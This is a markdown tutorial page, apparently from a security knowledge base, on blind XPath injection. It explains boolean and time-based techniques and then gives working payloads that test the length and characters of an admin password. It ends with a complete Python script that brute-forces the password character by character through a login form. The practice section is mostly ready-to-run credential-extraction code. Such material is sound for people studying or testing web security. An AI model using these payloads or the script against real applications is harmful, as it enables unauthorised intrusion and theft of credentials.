---
title: Blind XPath Exploitation Techniques
description: Learn blind XPath injection methods to extract data without direct output
  using boolean and time-based strategies.
keywords:
- blind XPath injection
- data extraction
- boolean-based extraction
- time-based XPath
- character-by-character
- web security
- XPath query manipulation
---

# Blind Exploitation

## Context

    In the realm of web security, blind XPath injection represents a sophisticated technique used to extract sensitive information from a system without receiving direct feedback in the form of error messages or data outputs. This method requires a deeper understanding of XPath query manipulation and the ability to interpret subtle behavioral changes in the system's responses. Familiarity with XPath syntax, boolean logic, HTTP request-response models, and basic XPath injection techniques is assumed.

## Theory

### Blind XPath Injection Fundamentals

    Blind XPath injection attacks occur when vulnerabilities in a web application allow an attacker to insert crafted XPath queries into a web request. While no direct outputs or error messages are returned, attackers can deduce information by noting variations in the applicationâ€™s behavior or response times.

### Boolean-Based Blind Extraction

    This method relies on sending carefully structured payloads that can return a boolean result to the attacker, who can then infer information from the presence or absence of certain behaviors in the application's HTTP responses, such as changes in content length or HTTP status codes.

### Character-by-Character Data Extraction

    This approach involves extracting data one character at a time by using XPath functions such as `substring()`, `string-length()`, and `codepoints-to-string()`. By iteratively gauging each character using conditional logic, an attacker can gradually reconstruct sensitive information such as passwords or session tokens.

### Time-Based Blind XPath

    Time-based blind XPath injection leverages time delays introduced into XPath queries that are conditionally true. This method exploits protocol weaknesses where XPath processors allow time-based functions which, when used correctly, can indicate true or false outcomes through measurable response delays.

## Practice

### Boolean-Based Blind XPath Extraction

    - Identify a parameter vulnerable to XPath injection by noting behavioral changes in responses.
    - Test password length with a boolean payload:
        ```http
        ' or string-length(//user[username="admin"]/password)=8 or '1'='2
        ```
    - Extract data character by character:
        ```http
        ' or substring(//user[username="admin"]/password,1,1)='a' or '1'='2
        ```
    - Adjust offsets and characters until each position is confirmed.
    - Outcome: password contents are reconstructed based on true or false evaluations.

### Time-Based Blind XPath Extraction

    - Craft payloads that trigger deliberate delays when a condition is true:
        ```http
        ' or (substring(//user[username="admin"]/password,1,1)='a' and ms:delay(5000)) or '1'='2
        ```
    - Measure response latency with a precise timer to separate true from false evaluations.
    - Iterate across character positions and candidate values until the data set is recovered.
    - Outcome: time differentials reveal correct characters without direct output.

### Automated Blind XPath Extraction with Character Set Brute Force

    - Automate boolean checks to accelerate extraction:
        ```python
        import string
        import requests

        url = "http://target-app/login"
        charset = string.ascii_letters + string.digits
        recovered = ""

        for idx in range(1, 33):
            for char in charset:
                payload = (
                    f"' or substring(//user[username=\"admin\"]/password,{idx},1)='{char}' or '1'='2"
                )
                resp = requests.post(url, data={"username": payload, "password": "x"})
                if "Welcome" in resp.text or resp.status_code == 302:
                    recovered += char
                    break
        print(recovered)
        ```
    - Capture server responses or redirects that signal a successful predicate.
    - Outcome: the script reconstructs the targeted credential string automatically.

## Tools

    - **Burp Suite**
    - **OWASP ZAP**
    - **custom Python scripts**